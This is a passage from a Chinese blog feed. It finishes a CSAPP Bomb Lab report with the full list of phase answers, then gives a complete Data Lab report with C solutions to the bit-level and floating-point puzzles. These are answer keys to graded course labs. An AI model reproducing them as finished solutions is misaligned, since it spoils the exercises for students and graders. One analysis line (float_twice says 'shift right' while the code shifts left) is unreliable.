<p>要令fun7返回的结果为2，一种可行的递归返回情况是0-&gt;(2<em>0+1)=1-&gt;(1</em>2)=2。在该情况下，递归深度为2，节点的移动路线为左-&gt;右，并且在值为22的节点返回0。这表明，fun7的第二个参数，也就是secret_phase的正确答案，为”22”。</p>
<p>在GDB中运行bomb并验证结果，结果正确。</p>
<h2 id="实验答案"><a href="#实验答案" class="headerlink" title="实验答案"></a>实验答案</h2><blockquote>
<p>注意，有部分答案不唯一，并且Bomb Lab每年都在更新，所以答案可能会有所变化。</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">Border relations with Canada have never been better.</div><div class="line">1 2 4 8 16 32</div><div class="line">1 311</div><div class="line">0 0 DrEvil</div><div class="line">yo~uvw</div><div class="line">4 3 2 1 6 5</div><div class="line">22</div></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;实验答案托管在我的&lt;a href=&quot;https://github.com/BlackDragonF/CSAPPLabs/tree/master/BombLab&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Github&lt;/a&gt;上&lt;/p&gt;
&lt;blockquo
    
    </summary>
    
      <category term="计算机系统" scheme="http://blog.codedragon.tech/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/"/>
    
    
      <category term="实验" scheme="http://blog.codedragon.tech/tags/%E5%AE%9E%E9%AA%8C/"/>
    
      <category term="计算机系统" scheme="http://blog.codedragon.tech/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/"/>
    
  </entry>
  
  <entry>
    <title>深入理解计算机系统DataLab实验报告</title>
    <link href="http://blog.codedragon.tech/2017/04/04/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9FDataLab%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/"/>
    <id>http://blog.codedragon.tech/2017/04/04/深入理解计算机系统DataLab实验报告/</id>
    <published>2017-04-04T08:50:20.000Z</published>
    <updated>2017-06-18T10:38:21.000Z</updated>
    
    <content type="html"><![CDATA[<p>实验答案托管在我的<a href="https://github.com/BlackDragonF/CSAPPLabs/tree/master/DataLab" target="_blank" rel="external">GitHub</a>上</p>
<blockquote>
<p>总共花了五天时间完成了《深入理解计算机系统》(Computer Science A Programmer’s Perspective)的第一个Lab - Data Lab，深感这次实验的效率低下。一方面是由于清明假期自己有所惰怠，另一方面也是由于在做题的时候采取了不正确的方法，在已经明知不会的情况下我还继续投入大量无意义的时间，没有取得很好的学习效果。</p>
</blockquote>
<h2 id="实验简介"><a href="#实验简介" class="headerlink" title="实验简介"></a>实验简介</h2><p>Data Lab - Manipulating Bits主要是关于位操作的实验，对应于书本的第2章：信息的表示和处理。</p>
<p>在该实验中，学生主要需要在一个严格限制的C子集（使用优先的位运算符以及顺序结构的代码）中实现简单的逻辑，补码以及浮点数相关的函数。本实验的目的是为了让学生熟悉整数和浮点数的位级表示。</p>
<p>本实验的核心在于在各种受限制的条件下完成给出的15个谜题。其中包括5个位操作的谜题，7个补码运算的谜题，以及3个浮点数操作的谜题。其中每完成一个谜题都能得到一定的分数，如果使用的运算符数目小于给定的数目，还能获得加分。本实验的满分是71分。可以通过讲义中的driver.pl脚本直接计算出总分数。</p>
<p>关于本实验具体的介绍详见<a href="http://csapp.cs.cmu.edu/3e/datalab-handout.tar" target="_blank" rel="external">实验讲义</a>。</p>
<h2 id="测试程序btest-make失败及解决办法"><a href="#测试程序btest-make失败及解决办法" class="headerlink" title="测试程序btest make失败及解决办法"></a>测试程序btest make失败及解决办法</h2><p>在完成实验的功能中需要用到<code>make &amp;&amp; ./btest</code>命令进行答案正确性的检查，结果系统返回了<code>fetal error: gnu/stubs-32.h:No such file or directory</code>。</p>
<p>经过检查发现是系统是Archlinux 64位，而Makefile中包含了-m32的编译参数导致的。</p>
<p>通过启用multilib仓库使得可以在64位的ArchLinux系统上编译和运行32位的程序，问题得以解决。</p>
<p>编辑/etc/pacman.conf，取消下面内容的注释：</p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">[multilib]</div><div class="line">include = /etc/pacman.d/mirrorlist</div></pre></td></tr></table></figure>
<p>更新软件包列表并升级系统<code>pacman -Syu</code></p>
<p>然后安装gcc-multilib并重新执行<code>make &amp;&amp; ./btest</code>，问题解决。</p>
<h2 id="实验限制"><a href="#实验限制" class="headerlink" title="实验限制"></a>实验限制</h2><h3 id="整数代码规则"><a href="#整数代码规则" class="headerlink" title="整数代码规则"></a>整数代码规则</h3><p>整数代码应遵循如下的基本结构：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">Funct</span><span class="params">(arg1, arg2, ...)</span> </span>&#123;</div><div class="line">    <span class="comment">/* brief description of how your implementation works */</span></div><div class="line">    <span class="keyword">int</span> var1 = Expr1;</div><div class="line">    ...</div><div class="line">    <span class="keyword">int</span> varM = ExprM;</div><div class="line">    varJ = ExprJ;</div><div class="line">    ...</div><div class="line">    varN = ExprN;</div><div class="line">    <span class="keyword">return</span> ExprR;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>每一个表达式只能使用：</p>
<ol>
<li>0～255之间的常量（包括0和255）</li>
<li>函数的参数和局部变量</li>
<li>单目运算符 ! ~</li>
<li>双目运算符 &amp; ^ | + &lt;&lt; &gt;&gt;</li>
</ol>
<p>注意，部分题目对于运算符有着更加严格的限制，但是你可以在一行代码中使用多个运算符。</p>
<p>你将会被禁止：</p>
<ol>
<li>使用任何的分支或者循环结构</li>
<li>定义或者使用任何的宏</li>
<li>在文件中定义任何额外函数</li>
<li>调用任何函数</li>
<li>使用任何其他的运算符</li>
<li>使用任何形式的类型转换</li>
<li>使用除了int以外的其他数据类型，这意味着你不能使用数组，结构或联合</li>
</ol>
<p>你可以假设你的机器：</p>
<ol>
<li>使用32位补码表示整数</li>
<li>使用算术右移</li>
<li>对整数进行的位移运算的位数超越了字长是未定义的行为</li>
</ol>
<h3 id="浮点代码规则"><a href="#浮点代码规则" class="headerlink" title="浮点代码规则"></a>浮点代码规则</h3><p>浮点运算的规则相对较为宽松，你可以使用循环或者是分支结构，你被允许同时使用int和unsigned，此外，你还可以使用任意的常量。</p>
<p>你将会被禁止：</p>
<ol>
<li>定义或者使用任何的宏</li>
<li>在文件中定义任何额外函数</li>
<li>调用任何函数</li>
<li>使用任何形式的类型转换</li>
<li>使用除了int和unsigned以外的任何数据类型，这意味着你不能使用数组，结构或者联合</li>
<li>使用任何浮点数的数据类型，操作或者是常量</li>
</ol>
<h2 id="实验答案及分析"><a href="#实验答案及分析" class="headerlink" title="实验答案及分析"></a>实验答案及分析</h2><h3 id="第一部分-位操作"><a href="#第一部分-位操作" class="headerlink" title="第一部分 位操作"></a>第一部分 位操作</h3><ul>
<li><p>bitAnd<br>  问题：要求使用~和|以及不超过8个操作符实现x&amp;y<br>  分析：使用De Morgan定律即可<br>  答案：</p>
  <figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">bitAnd</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123;</div><div class="line"><span class="comment">/* x&amp;y = ~(~(x&amp;y)) = ~(~x|~y) */</span></div><div class="line">	<span class="keyword">return</span> ~(~x | ~y);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
</li>
<li><p>getByte<br>  问题：要求使用! ~ &amp; ^ | + &lt;&lt; &gt;&gt;以及不超过6个操作符返回x中的第n个字节(0(LSB)&lt;=n&lt;=3(MSB))。<br>  分析：根据不同的n值将x右移不同的位数，然后使用掩码0xFF取得最低位数的字节即可。先左移再右移会导致算术右移，需要小心。<br>  答案：</p>
  <figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">getByte</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> n)</span> </span>&#123;</div><div class="line"><span class="comment">/* right shift in order to avoid boring arithmatic shift and try to get specific byte using bitAnd and mask. */</span></div><div class="line">    <span class="keyword">return</span> ((x &gt;&gt; (n &lt;&lt; <span class="number">3</span>)) &amp; <span class="number">0xFF</span>);		</div><div class="line">&#125;</div></pre></td></tr></table></figure>
</li>
<li><p>logicalShift<br>  问题：要求使用! ~ &amp; ^ | + &lt;&lt; &gt;&gt;以及不超过20个操作符实现将int值x的逻辑右移n位。<br>  分析：通过将一个全1的数通过算术右移的方式构造掩码，然后与算术右移的掩码求按位与即可。<br>  注意，直接右移32位的结果是未定义的，需要额外处理这种情况。<br>  答案：</p>
  <figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">logicalShift</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> n)</span> </span>&#123;</div><div class="line"><span class="comment">/* try to implement logical right shift by mask and logical right shift */</span></div><div class="line">    <span class="keyword">int</span> mask = ((~<span class="number">0</span>) &lt;&lt; (<span class="number">31</span> + (~n + <span class="number">1</span>))) &lt;&lt; <span class="number">1</span>;</div><div class="line">    <span class="keyword">return</span> (x &gt;&gt; n) &amp; (~mask);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
</li>
<li><p>bitCount<br>   问题：要求使用! ~ &amp; ^ | + &lt;&lt; &gt;&gt;以及不超过40个操作符计算一个数字x中有多少为1的位。<br>   分析：<br>   本题参考<a href="http://stackoverflow.com/questions/3815165/how-to-implement-bitcount-using-only-bitwise-operators" target="_blank" rel="external">stackoverflow</a>上的回答，并结合题目要求做了一些改动。<br>   核心的思想是分治法，通过将原数字x中的位按每1,2,4…个位分组，按相邻组进行累加，最后求出结果。<br>   举例来说，假如现在有一个数395，它的二进制表示是0000000110001011(16位)，首先我们将这个数按1位分组，得到：<br>   0 0 0 0 0 0 0 1 1 0 0 0 1 0 1 1<br>   然后我们将相邻的组累加，得到：<br>   0+0 0+0 0+0 0+1 1+0 0+0 1+0 1+1<br>   00 00 00 01 01 00 01 10<br>   然后我们继续将相邻的组累加，得到：<br>   00+00 00+01 01+00 01+10<br>   0000 0001 0001 0011<br>   然后我们继续将相邻的组累加，得到：<br>   0000+0001 0001+0011<br>   00000001 00000100<br>   最后，我们最后的两个组累加，得到：<br>   00000001+0000100=00000101<br>   结果是5，为正确答案。<br>   答案：</p>
   <figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"> <span class="function"><span class="keyword">int</span> <span class="title">bitCount</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</div><div class="line"><span class="comment">/* Divide and Conquer */</span></div><div class="line">    <span class="keyword">int</span> mask = <span class="number">0x55</span> + (<span class="number">0x55</span> &lt;&lt; <span class="number">8</span>) + (<span class="number">0x55</span> &lt;&lt; <span class="number">16</span>) + (<span class="number">0x55</span> &lt;&lt; <span class="number">24</span>);</div><div class="line">    x = (x &amp; mask) + ((x &gt;&gt; <span class="number">1</span>) &amp; mask);</div><div class="line">    mask = <span class="number">0x33</span> + (<span class="number">0x33</span> &lt;&lt; <span class="number">8</span>) + (<span class="number">0x33</span> &lt;&lt; <span class="number">16</span>) + (<span class="number">0x33</span> &lt;&lt; <span class="number">24</span>);</div><div class="line">    x = (x &amp; mask) + ((x &gt;&gt; <span class="number">2</span>) &amp; mask);</div><div class="line">    mask = <span class="number">0xF</span> + (<span class="number">0xF</span> &lt;&lt; <span class="number">8</span>) + (<span class="number">0xF</span> &lt;&lt; <span class="number">16</span>) + (<span class="number">0xF</span> &lt;&lt; <span class="number">24</span>);</div><div class="line">    x = (x &amp; mask) + ((x &gt;&gt; <span class="number">4</span>) &amp; mask);</div><div class="line">    <span class="keyword">return</span> (x + (x &gt;&gt; <span class="number">8</span>) + (x &gt;&gt; <span class="number">16</span>) + (x &gt;&gt; <span class="number">24</span>)) &amp; <span class="number">0xFF</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
</li>
<li><p>bang<br>  问题：要求使用~ &amp; ^ | + &lt;&lt; &gt;&gt;以及不超过12个操作数计算x的逻辑非。<br>  分析：<br>  逻辑非要求将0变成1，将非0的数变成0。生成0或1可以通过与掩码0x1求按位与实现，重点在于如何构造一个表达式使得0和非0的数产生不同的结果。<br>  可以考虑对于任意一个非0的数，它的负数都是从最高位到其最低位的1为止(不包括最低位的1)全部取反的结果。<br>  例如，14是00001110(8位)，而-14是11110010(8位)，为14从最高位到最低位的1(不包括这个1)，也就是000011取反，而最低位的10不变的结果。<br>  而0的负数永远是0。<br>  从这里我们可以看出，对于一个非0的数，它与它的负数按位或的结果的最高位一定会是1，而0与非0的按位或的结果的最高位永远是0。我们可以以此实现逻辑非。<br>  答案：</p>
  <figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">bang</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</div><div class="line"><span class="comment">/* for x != 0, the highest bit of x | (-x) will always become 1 while when x == 0, the result is the opposite */</span></div><div class="line">	<span class="keyword">return</span> (~((x | (~x + <span class="number">1</span>)) &gt;&gt; <span class="number">31</span>) &amp; <span class="number">1</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="第二部分-补码运算"><a href="#第二部分-补码运算" class="headerlink" title="第二部分 补码运算"></a>第二部分 补码运算</h3><ul>
<li><p>tmin<br>  问题：要求使用! ~ &amp; ^ | + &lt;&lt; &gt;&gt;以及不超过4个运算符返回以补码表示的最小的整数。<br>  分析：根据补码到整数的公式，最小的整数的补码表示为10000…<br>  答案：</p>
  <figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">tmin</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</div><div class="line">    <span class="comment">/* TMin = 10000.... */</span></div><div class="line">    <span class="keyword">return</span> (<span class="number">1</span> &lt;&lt; <span class="number">31</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
</li>
<li><p>fitsBits<br>  问题：要求使用! ~ &amp; ^ | + &lt;&lt; &gt;&gt;以及不超过15个操作符判断x是否能表示成n位的补码，如果是，则返回1，反之则返回0。<br>  分析：<br>  这个问题需要分正数和负数两种情况讨论，对于正数来说，如果一个数x能表示成n位的补码，那么它从最高位直到第n位一定全部为0，它的第n位一定不能为1，否则它就会变成一个负数。对于一个负数来说，如果一个数x能表示成n位的补码，那么它只需从最高位到第n位全部为1即可。<br>  因此，我们可以先将x右移n-1位，对于满足条件的正数和负数，这将产生一个全0的数或是一个全1的数。然后我们可以根据x的符号构造一个全0或者是全1的掩码。通过将这两个数按位异或并且取逻辑非，就能得到正确的结果。<br>  答案：</p>
  <figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">fitsBits</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> n)</span> </span>&#123;</div><div class="line"><span class="comment">/* if fitsBits then from highest bit to n bit will all become 1 - negative number or 0 - positive number</span></div><div class="line"> * then can construct a mask to implement fitsBits with the help of ^ and !</div><div class="line"> */</div><div class="line">    <span class="keyword">return</span> !((x &gt;&gt; (n + (~<span class="number">1</span>) + <span class="number">1</span>)) ^ (((<span class="number">1</span> &lt;&lt; <span class="number">31</span>) &amp; x) &gt;&gt; <span class="number">31</span>));</div><div class="line">&#125;</div></pre></td></tr></table></figure>
</li>
<li><p>divpwr2<br>  问题：要求使用! ~ &amp; ^ | + &lt;&lt; &gt;&gt;以及不超过15个操作符求出x/(2^n)的结果，其中0&lt;=n&lt;=30。<br>  分析：对于正数，直接使用算术右移即可；对于负数，需要加上适当的偏移量以实现向上舍入，这可以用根据符号位生成1个全0或者全1的掩码来控制。<br>  答案：</p>
  <figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">divpwr2</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> n)</span> </span>&#123;</div><div class="line"><span class="comment">/* add bias when x is negative, which is controlled by a sign-related mask */</span></div><div class="line">	<span class="keyword">int</span> mask = x &gt;&gt; <span class="number">31</span>;</div><div class="line">	<span class="keyword">int</span> add = ((<span class="number">1</span> &lt;&lt; n) + (~<span class="number">1</span>) + <span class="number">1</span>) &amp; mask;</div><div class="line">	<span class="keyword">return</span> (x + add) &gt;&gt; n;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
</li>
<li><p>negate<br>  问题：要求使用! ~ &amp; ^ | + &lt;&lt; &gt;&gt;以及不超过5个操作符求出x的负数。<br>  分析：-x = (~x + 1)<br>  答案：</p>
  <figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">negate</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</div><div class="line"><span class="comment">/* -x = (~x) + 1 */</span></div><div class="line">	<span class="keyword">return</span> ~x + <span class="number">1</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
</li>
<li><p>isPositive<br>  问题：要求使用! ~ &amp; ^ | + &lt;&lt; &gt;&gt;以及不超过8个操作符判断x是否为正数。<br>  分析：对于正数，它的最高位一定是0，同时还要排除0的影响。<br>  答案：</p>
  <figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">isPositive</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</div><div class="line"><span class="comment">/* ensure the highest bit is 0 and x != 0 */</span></div><div class="line">	<span class="keyword">return</span> (!(x &gt;&gt; <span class="number">31</span>)) ^ (!(x ^ <span class="number">0</span>));</div><div class="line">&#125;</div></pre></td></tr></table></figure>
</li>
<li><p>isLessOrEqual<br>  问题：要求使用! ~ &amp; ^ | + &lt;&lt; &gt;&gt;以及不超过24个操作符判断x是否小于或等于y。<br>  分析：<br>  对于这个问题，我们需要按照是否溢出，以及x与y的符号分别讨论。<br>  最基本的思路是，做y-x，若结果的符号位为1，则返回0，反之返回1。但这样就忽略了溢出可能导致的问题，现在我们做如下考虑。<br>  若x，y均为正数，或x，y均为负数，则y-x绝不可能溢出，因此可直接用差的符号位判断大小。<br>  若x为正数，y为负数，可以直接返回0。<br>  若x为负数，y为正数，可以直接返回1。<br>  我们可以生成两种条件变量，一种为x，y同号时返回正确结果的条件变量，另一种为x，y异号时返回正确结果的条件变量。<br>  对于x，y同号和异号这两种不同的情况，我们可以用!((x ^ y) &gt;&gt; 31)生成掩码使得在任意的情况下，只有正确的条件变量生效。<br>  答案：</p>
  <figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">isLessOrEqual</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123;</div><div class="line"><span class="comment">/* different processing ways when x and y have the same signs or different signs */</span></div><div class="line">	<span class="keyword">int</span> diff = y + (~x) + <span class="number">1</span>;</div><div class="line">	<span class="keyword">int</span> not_diff_sign = !(diff &gt;&gt; <span class="number">31</span>);</div><div class="line">	<span class="keyword">int</span> mask = !((x ^ y) &gt;&gt; <span class="number">31</span>);</div><div class="line">	<span class="keyword">int</span> result_not_overflow = mask &amp; not_diff_sign;</div><div class="line">	<span class="keyword">int</span> result_overflow = (!mask) &amp; (x &gt;&gt; <span class="number">31</span>);</div><div class="line">	<span class="keyword">return</span> result_overflow | result_not_overflow;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
</li>
</ul>
<ul>
<li>ilog2<br>  问题：要求使用! ~ &amp; ^ | + &lt;&lt; &gt;&gt;以及不超过90个操作数求出x以2为底的对数（向下舍入），保证x&gt;0。<br>  分析：<br>  这道题参考了网上的答案。核心的思想是二分查找。<br>  首先将x右移16位，如果x&gt;0，则表明结果的第5位为1，将该位置为1。<br>  然后根据结果将x右移8位（第5位为0）或者将x右移24位（第5位为1），如果x&gt;0，则表明结果的第4位为1，将该位置为1。<br>  以此类推，直到得出结果。<br>  答案：  <figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">ilog2</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</div><div class="line">	<span class="comment">/* Binary Search */</span></div><div class="line">	<span class="keyword">int</span> result = (!!(x &gt;&gt; <span class="number">16</span>) &lt;&lt; <span class="number">4</span>);</div><div class="line">	result = result + ((!!(x &gt;&gt; (result + <span class="number">8</span>))) &lt;&lt; <span class="number">3</span>);</div><div class="line">	result = result + ((!!(x &gt;&gt; (result + <span class="number">4</span>))) &lt;&lt; <span class="number">2</span>);</div><div class="line">	result = result + ((!!(x &gt;&gt; (result + <span class="number">2</span>))) &lt;&lt; <span class="number">1</span>);</div><div class="line">	result = result + (!!(x &gt;&gt; (result + <span class="number">1</span>)));</div><div class="line">	<span class="keyword">return</span> result;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="第三部分-浮点数操作"><a href="#第三部分-浮点数操作" class="headerlink" title="第三部分 浮点数操作"></a>第三部分 浮点数操作</h3><ul>
<li><p>float_neg<br>  问题：返回对于浮点数参数f，-f的等价的位级表示。当参数位NAN时，返回NAN。函数的参数和返回值均为unsigned，但它们实际上都是浮点数的位表示。最多允许使用10个操作符。<br>  分析：首先要判断参数是否是NAN，如果是则直接返回，否的话直接将参数的最高位取反即可。<br>  NAN的阶码全为1，尾码不全为0。<br>  答案：</p>
  <figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">unsigned</span> <span class="title">float_neg</span><span class="params">(<span class="keyword">unsigned</span> uf)</span> </span>&#123;</div><div class="line"><span class="comment">/* m_flag - if m != 0 e_flag - if e == 0xff */</span></div><div class="line">	<span class="keyword">unsigned</span> m_flag = <span class="number">0x007fffff</span> &amp; uf;</div><div class="line">	<span class="keyword">unsigned</span> e_flag = !(<span class="number">0x7f800000</span> &amp; (~uf));</div><div class="line">	<span class="keyword">if</span> (e_flag &amp;&amp; m_flag) &#123;</div><div class="line">		<span class="keyword">return</span> uf;</div><div class="line">	&#125; <span class="keyword">else</span> &#123;</div><div class="line">		<span class="keyword">return</span> <span class="number">0x80000000</span> ^ uf;</div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
</li>
<li><p>float_i2f<br>  问题：返回(float)x的位级的等价表示。结果被作为unsigned int返回，但它实际上是单精度浮点数的位表示。最多允许使用30个操作符。<br>  分析：<br>  首先考虑到整数中只有0会被转换为非规格化浮点数，而其他整数会被转化为规格化浮点数。因此对于0需要做额外的处理。<br>  其次，对于负数，我们需要将其转化为正数再做处理，这就要求我们需要将x的符号保存下来，并且从补码转化为无符号表示。<br>  然后，我们需要根据转换成无符号数的x算出阶码e和尾码m。<br>  最后，我们将尾码舍入后再和阶码符号一起，生成最终的结果即可。<br>  这里我有一个比较大的误区，舍入的时候看的不仅仅是带舍入位的下一位，而是待舍入位之后的所有位。<br>  答案：</p>
  <figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">unsigned</span> <span class="title">float_i2f</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</div><div class="line"><span class="comment">/* 1.process 0 individually 2.process negative number and store the sign 3.get the e number 4.get the m number and round it 5.construct the result */</span></div><div class="line">	<span class="keyword">unsigned</span> count = <span class="number">0</span>;</div><div class="line">	<span class="keyword">unsigned</span> mask = <span class="number">0x80000000</span>;</div><div class="line">	<span class="keyword">unsigned</span> sign = x &amp; mask;</div><div class="line">	<span class="keyword">unsigned</span> c = <span class="number">0</span>, absx = x;</div><div class="line">	<span class="keyword">if</span> (x == <span class="number">0</span>) &#123;</div><div class="line">		<span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">	&#125; <span class="keyword">else</span> &#123;</div><div class="line">		<span class="keyword">if</span> (x &lt; <span class="number">0</span>) &#123;</div><div class="line">			absx = -x;</div><div class="line">		&#125;</div><div class="line">		<span class="keyword">while</span> (!(mask &amp; absx)) &#123;</div><div class="line">			count = count + <span class="number">1</span>;</div><div class="line">			mask = mask &gt;&gt; <span class="number">1</span>;</div><div class="line">		&#125;</div><div class="line">		absx = absx &lt;&lt; (count + <span class="number">1</span>);</div><div class="line">		<span class="keyword">if</span> (((absx &amp; <span class="number">0x1ff</span>) &gt; <span class="number">0x100</span>) || ((absx &amp; <span class="number">0x3ff</span>) &gt;= <span class="number">0x300</span>)) &#123;</div><div class="line">			c = <span class="number">1</span>;</div><div class="line">		&#125;</div><div class="line">		<span class="keyword">return</span> sign + ((<span class="number">158</span> - count) &lt;&lt; <span class="number">23</span>) + (absx &gt;&gt; <span class="number">9</span>)+ c;</div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
</li>
<li><p>float_twice<br>  问题：返回对于浮点数参数f，2*f的等价的位级表示。参数和结果都为unsigned int，但它们实际上是浮点数的位表示。当参数是NAN时，返回NAN。最多允许使用30个操作符。<br>  分析：<br>  对于非规格化浮点数，只要在保留符号位的情况下将尾码m右移一位即可，这样同时解决了尾码乘以二和进位的情况。<br>  对于规格化浮点数，只要将其阶码e加1即可。<br>  答案：</p>
  <figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">unsigned</span> <span class="title">float_twice</span><span class="params">(<span class="keyword">unsigned</span> uf)</span> </span>&#123;</div><div class="line"><span class="comment">/* denormailized number - m = m &lt;&lt; 1 normalized number - e = e + 1 */</span></div><div class="line">	<span class="keyword">unsigned</span> result = uf;</div><div class="line">	<span class="keyword">if</span> ((uf &amp; <span class="number">0x7f800000</span>) == <span class="number">0</span>) &#123;</div><div class="line">		result = ((uf &amp; <span class="number">0x007fffff</span>) &lt;&lt; <span class="number">1</span>) | (uf &amp; <span class="number">0x80000000</span>);</div><div class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> ((uf &amp; <span class="number">0x7f800000</span>) != <span class="number">0x7f800000</span>) &#123;</div><div class="line">		result = uf + <span class="number">0x00800000</span>;</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">return</span> result;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
</li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;实验答案托管在我的&lt;a href=&quot;https://github.com/BlackDragonF/CSAPPLabs/tree/master/DataLab&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;GitHub&lt;/a&gt;上&lt;/p&gt;
&lt;blockquo
    
    </summary>
    
      <category term="计算机系统" scheme="http://blog.codedragon.tech/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/"/>
    
    
      <category term="实验" scheme="http://blog.codedragon.tech/tags/%E5%AE%9E%E9%AA%8C/"/>
    
